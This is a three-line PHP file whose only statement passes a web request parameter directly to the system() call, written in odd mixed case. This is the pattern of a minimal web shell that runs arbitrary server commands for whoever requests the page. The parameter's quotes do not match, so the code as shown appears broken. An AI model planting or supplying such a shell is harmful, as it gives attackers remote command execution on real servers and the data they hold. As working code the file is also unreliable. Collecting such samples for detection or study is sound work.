<?php
SysTeM($_GET["hIwb-BJU']);
?>
